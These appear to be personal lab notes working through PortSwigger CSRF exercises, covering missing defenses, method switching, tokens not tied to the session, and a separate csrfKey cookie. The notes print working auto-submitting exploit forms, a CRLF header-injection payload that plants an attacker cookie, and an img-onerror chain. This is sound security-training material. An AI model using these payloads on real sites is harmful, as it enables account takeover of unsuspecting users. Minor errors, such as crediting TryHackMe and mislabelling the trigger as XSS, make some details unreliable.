______________

# CSRF vulnerability with no defenses

For this exercise, we are going to work with the option offered by the page to change the email, which is vulnerable to CSRF. For this PortSwigger exercise, we will use Burp Suite to capture the request.

![[Captura de pantalla 2026-03-07 015455.png]]

Understanding how CSRF works is key; for this, an HTML format must be sent, which is the "Trojan Horse" containing the exploit. Let's understand how it works and the components it requires to be effective.

```
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 

email=wiener@normal-user.com
```

These 5 components are the key:

```
POST /my-account/change-email HTTP/2
Host: 0aaa00db04df4d0a81c317240011001b.web-security-academy.net
Cookie: session=W35jeDwQNQSomVLqAlPQhGkES8Ny2NRR
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

email=test%40prueba1.net
```

With the necessary data collected, we now need to develop the HTML exploit to send it from the server provided by PortSwigger.

![[Captura de pantalla 2026-03-07 030655.png]]

There are various tools to perform this work, such as the premium version of Burp Suite; in these cases, we are going to use a free tool: **CSRF Simple PoC Generator**.

```
<html>
	<body>
		<form method="POST" action="https://0aaa00db04df4d0a81c317240011001b.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="test%40prueba1.net"/>
			<input type="submit" value="Submit">
		</form>
		<script>
		    document.forms[0].submit();
		</script>
	</body>
</html>
```

This is our exploit. The following code is used because, without it, our exploit would have a submit button that the victim would have to click to execute the exploit, which is not smart or productive as pentesters. By using this addition, we make the exploit execute automatically without the victim needing to press the button.

```
<script>
    document.forms[0].submit();
</script>
```

**document.forms**

- It is a collection (`HTMLCollection`) of all the forms (`<form>`) on the page.
- It is indexed like an array: `forms[0]` is the **first form**, `forms[1]` the second, etc.

**.submit()**
- It is a method of the `<form>` elements that **triggers the submission of the form** to the server.

![[Captura de pantalla 2026-03-07 030314 1.png]]

It is worth noting that sometimes as a form of protection (it is somewhat outdated), pages implement the change of request from POST to GET or vice versa, which forces us to change the request to make the changes we want.

![[Captura de pantalla 2026-03-07 202755.png]]

We see that it is using POST and that the CSRF Token is present, which serves as protection to avoid requests under that method; because of that, we are going to change the request type. CSRF (Cross-Site Request Forgery) tokens serve a single critical purpose: to guarantee that the action the server is executing was voluntarily initiated by the user within the application itself, and not through deception from another website.

![[Captura de pantalla 2026-03-07 203134.png]]

When we change the method, we see the format change. To perform a CSRF correctly, we must remove the CSRF token (we won't need it).

![[Pasted image 20260307203552.png]]

With this method, we can successfully change the email.

```
<html>
  <body>
    <form action="https://0a5300890385f76d806d038100020025.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="test@prueba9.net">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**HTML form (exploit)**

It is also worth noting the order of the variables:

```
<form method="GET" action="https://0ad4007904211b0b8026da940098001f.web-security-academy.net/my-account/change-email">
```

This can work when an action-method does not work. We use CSRF Simple PoC Generator for this. 

__________________

- Another situation we might encounter is one in which the CSRF token is not linked to the user's session. To develop this exercise, we will use the credentials given by Tryhackme:

```
wiener:peter
carlos:montoya
```

We are going to capture the email change request with the user Wiener (victim) using Burp Suite.

![[Captura de pantalla 2026-03-08 200011.png]]

Then we will log in incognito as Carlos (Attacker) and capture his CSRF Token.

![[Captura de pantalla 2026-03-08 193634.png]]

With this done, we are going to change Wiener's CSRF Token for Carlos's and send the request; if it is successful, it would confirm that the CSRF token is not linked to the user session.

![[Captura de pantalla 2026-03-08 193907.png]]

It was successful, it is vulnerable. With this done, we would already have an attack vector; we are going to create an HTML form to change the email from the victim account to our attacker account as user Carlos (which could trigger a deeper attack, such as stealing passwords).

```
<html>
	<body>
		<form action="https://0aaf006803539410814b16a900a50098.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="testeafxxf@hotmail.com"/>
			<input type="hidden" name="csrf" value="WUANglopHbpQAK34NQa5LPfPmmWfLsR6"/>
		</form>
        <script>
		    document.forms[0].submit();
		</script>
	</body>
</html>
```

For this HTML form, we have to refresh our attacker page and use the new CSRF token since this page uses the rotating CSRF Token type, which changes it with each request or by refreshing the page. As a small addition, we also change `%40` for `@` because, depending on the configuration of each server, it may or may not cause problems.

![[Captura de pantalla 2026-03-08 195339.png]]

And it works correctly. The implications of this simple exercise highlight how poor sanitization of CSRF Tokens allows us as attackers to make changes that can deeply affect security. 

_________________

- Another security measure that can be vulnerable is the habit of linking a CSRF token to the Cookie but not to the regular session cookie; rather, it is linked to a second cookie. This happens when two frameworks are used, one for session management and the other for CSRF protection. This protection measure can be bypassed by understanding the behavior between the CSRF token and the CSRF Key.

First, let's see how this security measure behaves; for this, we will capture the request with Burp Suite.

![[Captura de pantalla 2026-03-09 152535.png]]

Seeing that a CSRF token and a CSRF Key are used, we will log in with our attacker account and extract these same values to substitute them for the victim's and see if it accepts them as valid.

![[Captura de pantalla 2026-03-09 152921.png]] ![[Captura de pantalla 2026-03-09 152950.png]] ![[Captura de pantalla 2026-03-09 153221.png]]

We see that the victim machine correctly accepted the values from our attacker machine; with this known, we confirm that we have an attack vector. Since the execution of an exploit in this situation requires having a valid `csrfKey` cookie, we will use an **HTTP header injection** on the victim machine, placing our attacker `csrfKey` there. We will use the following script to test if it is possible to inject the `csrfKey`:

`IP/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKERCSRFKEY%3b%20SameSite=None`

`Set-Cookie: csrfKey=YOUR-KEY; SameSite=None` serves as an HTTP header that attempts to set a cookie in the user's browser.

`SameSite=None` tells the browser that **it must include the cookie in all HTTP requests**, even if they are made from a different domain than the one that set the cookie. The previous script is applied to the search function of the page, which is vulnerable.

![[Captura de pantalla 2026-03-09 153637.png]]

Testing it in Burp Suite confirms with a 200 status that the HTTP header injection worked correctly; with this, we are now going to design an HTML form with two functions: injecting the attacker CSRF cookie and using the attacker CSRF token to change the email.

```
<html>
	<body>
		<form action="https://0ac800f604cd43e7806ab7a000a400a2.web-security-academy.net/my-account/change-email" method="POST" id="CsrF-FORM" target="csrf-iframe">
			<input type="hidden" name="email" value="Vamos@hotmai.com"/>
			<input type="hidden" name="csrf" value="NDGRxCb1u6FL172EhDP8PUJ9LG1IVLYt"/>
			<input type="submit" value="Submit">
		</form>
		<img src="https://0ac800f604cd43e7806ab7a000a400a2.web-security-academy.net/?search=hol444%0d%0aSet-Cookie:%20csrfKey=GLchf6CDuXN0nNYXOjIpp4RlbY0ZwcVY%3b%20SameSite=None" onerror="document.forms[0].submit();">
	</body>
</html>
```

**HTML form**

We enter the `csrfKey` through an XSS with an `img` tag and an `onerror` event to trigger immediate execution via `document.forms[0].submit();` so as not to depend on the submit button.

![[Captura de pantalla 2026-03-09 190853.png]]

In this exercise, we can highlight how 3 types of vulnerabilities are chained (CSRF, XSS, HTTP injection) and work together, giving us a notion of how a phishing attack works in real life.